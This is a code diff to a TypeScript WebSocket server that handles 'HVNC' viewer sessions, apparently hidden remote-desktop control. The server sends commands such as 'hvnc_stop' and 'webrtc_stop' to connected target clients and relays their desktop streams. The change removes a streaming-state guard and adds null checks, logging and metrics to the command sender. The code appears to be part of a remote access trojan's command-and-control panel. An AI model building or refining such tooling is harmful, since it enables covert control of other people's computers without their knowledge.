@@ -1179,13 +1179,11 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       const otherHvncViewers = sessionManager.getHvncSessionsForClient(clientId)
         .filter(s => s.id !== ws.data.sessionId);
       if (otherHvncViewers.length === 0) {
-        if (state.isStreaming) {
-          sendHVNCCommand(target, "hvnc_stop", {});
-          sendHVNCCommand(target, "webrtc_stop", { kind: "hvnc" });
-          state.isStreaming = false;
-          hvncStreamingState.set(clientId, state);
-          logger.debug(`[hvnc] stopped streaming for client ${clientId}`);
-        }
+        sendHVNCCommand(target, "hvnc_stop", {});
+        sendHVNCCommand(target, "webrtc_stop", { kind: "hvnc" });
+        state.isStreaming = false;
+        hvncStreamingState.set(clientId, state);
+        logger.debug(`[hvnc] stopped streaming for client ${clientId}`);
       } else {
         logger.debug(`[hvnc] ignoring hvnc_stop for client ${clientId} - ${otherHvncViewers.length} other viewer(s) still active`);
       }
@@ -1408,8 +1406,20 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
   }
 }
 
-export function sendHVNCCommand(target: ClientInfo, commandType: string, payload: any) {
-  target.ws.send(encodeMessage({ type: "command", commandType: commandType as any, id: uuidv4(), payload }));
+export function sendHVNCCommand(target: ClientInfo | undefined, commandType: string, payload: any) {
+  if (!target) {
+    logger.warn(`[hvnc] send command skipped, target missing command=${commandType}`);
+    return false;
+  }
+  try {
+    logger.debug(`[hvnc] send command command=${commandType} client=${target.id} payload=${JSON.stringify(payload || {})}`);
+    target.ws.send(encodeMessage({ type: "command", commandType: commandType as any, id: uuidv4(), payload }));
+    metrics.recordCommand(commandType);
+    return true;
+  } catch (err) {
+    logger.error("[hvnc] send command failed", err);
+    return false;
+  }
 }
 
 (globalThis as any).__hvncBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
